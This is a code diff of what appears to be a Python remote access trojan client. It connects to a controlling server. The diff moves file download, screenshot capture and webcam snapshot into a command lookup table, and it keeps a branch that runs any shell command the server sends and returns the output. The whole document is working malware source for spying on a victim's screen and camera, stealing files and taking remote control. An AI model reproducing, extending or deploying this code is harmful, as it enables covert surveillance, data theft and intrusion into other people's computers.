@@ -5,8 +5,15 @@ import time
 import signal
 import sys
 import struct
+import commands
 from cv2 import cv2
 import pyscreenshot as ImageGrab
+
+command_lookup = {
+    "download": commands.download_cli,
+    "capturing": commands.screenshot_cli,
+    "snap": commands.webcam_cli
+}
 
 class Client(object):
 
@@ -40,6 +47,7 @@ class Client(object):
             raise
         return
 
+    # this function is very handy
     def print_output(self, output_str):
         """ Prints command output """
         sent_message = str.encode(output_str + str(os.getcwd()) + '::> ')
@@ -61,85 +69,41 @@ class Client(object):
         while True:
             output_str = None
             data = self.socket.recv(20480)
-
             if data == b'': break
 
-            elif data.decode("utf-8") == 'disconnect':
-                self.socket.close()
-                sys.exit(0)
+            try:
+                output_str = command_lookup[data[:].decode("utf-8")](self.socket)
+            except:
+                if data[:2].decode("utf-8") == 'cd':
+                    # e.g. cd dir
+                    # "cd" = args[:2] and "dir" = args[3:]
+                    directory = data[3:].decode("utf-8")
+                    try: #chdir to wanted directory
+                        os.chdir(directory.strip())
+                    except Exception as e: # normally if it doesn't exist
+                        output_str = "Could not change directory: %s\n" %str(e)
+                    else: 
+                        output_str = ""
+                
+                elif data[:].decode("utf-8") == 'quit':
+                    self.socket.close()
+                    break
 
-            elif data.decode("utf-8") == 'download':
-                filename = self.socket.recv(1024).decode("utf-8")
-                try:
-                    f = open(str(filename), 'rb')
-                except FileNotFoundError:
-                    self.socket.send(b'FileNotFound')
-                    continue
-                i = f.read(1024)
-                while (i):
-                    self.socket.send(i)
-                    i = f.read(1024)
-                f.close()
-                self.socket.send(b'complete')
-                output_str = ""
-
-            elif data.decode("utf-8") == 'capturing':
-                im = ImageGrab.grab()
-                im.save('screenshot.png')
-                f = open('screenshot.png', 'rb')
-                i = f.read(1024)
-                while i != b'':
-                    self.socket.send(i)
-                    i = f.read(1024)
-                f.close()
-                self.socket.send(b'complete')
-                os.remove('screenshot.png')
-                output_str = ""
-
-            elif data.decode("utf-8") == "snap":
-                cap = cv2.VideoCapture(0)
-                ret_value, image = cap.read()
-                cv2.imwrite('camera.png', image)
-                del(cap)
-                self.socket.send('webcam')
-                f = open('camer.png', 'rb')
-                i = f.read(1024)
-                while i != b'':
-                    self.socket.send(i)
-                    i = f.read(1024)
-                f.close()
-                self.socket.send(b'complete')
-                os.remove('camera.png')
-                output_str = ""
-
-            elif data[:2].decode("utf-8") == 'cd':
-                directory = data[3:].decode("utf-8")
-                try:
-                    os.chdir(directory.strip())
-                except Exception as e:
-                    output_str = "Could not change directory: %s\n" %str(e)
-                else: 
-                    output_str = ""
-
-            elif data[:].decode("utf-8") == 'quit':
-                self.socket.close()
-                break
-
-            elif len(data) > 0:
-                try:
-                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                    output_str = output_bytes.decode("utf-8", errors="replace")
-                except Exception as e:
-                    # TODO: Error description is lost
-                    output_str = "Command execution unsuccessful: %s\n" %str(e)
-            
-            if output_str is not None:
-                try:
-                    self.print_output(output_str)
-                except Exception as e:
-                    print('Cannot send command output: %s' %str(e))
+                elif len(data) > 0:
+                    try:
+                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                        output_str = output_bytes.decode("utf-8", errors="replace")
+                    except Exception as e:
+                        # TODO: Error description is lost
+                        output_str = "Command execution unsuccessful: %s\n" %str(e)
+            finally: 
+                if output_str is not None:
+                    try:
+                        self.print_output(output_str)
+                    except Exception as e:
+                        print('Cannot send command output: %s' %str(e))
         
         self.socket.close()
         return
